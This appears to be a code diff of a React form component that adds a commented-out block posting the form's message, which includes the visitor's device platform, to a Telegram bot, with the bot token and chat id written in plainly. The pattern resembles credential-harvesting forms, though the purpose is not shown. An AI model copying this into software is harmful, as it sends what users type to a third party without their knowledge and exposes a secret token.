@@ -56,6 +56,17 @@ Device: *${window.navigator.platform}*
 				message: fbTemplate,
 			},
 		});
+
+		// // const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = process.env;
+		// const url = `https://api.telegram.org/bot2107169731:AAEaVSk361VzRDdOJjLTLDQxIeZ0gXLsWZ0/sendMessage`;
+		// const data = {
+		// 	chat_id: 2126810553,
+		// 	text: fbTemplate,
+		// };
+		// axios(url, {
+		// 	method: "POST",
+		// 	data,
+		// })
 	};
 
 	const handleChange = (event) => {
@@ -67,7 +78,7 @@ Device: *${window.navigator.platform}*
 	};
 
 	return (
-		<>
+		<div style={{ maxWidth: "800px" }}>
 			<FormControl fullWidth>
 				<TextField
 					autoComplete="off"
@@ -94,6 +105,6 @@ Device: *${window.navigator.platform}*
 				/>
 			</FormControl>
 			<Button onClick={handleSubmit}>提交</Button>
-		</>
+		</div>
 	);
 }
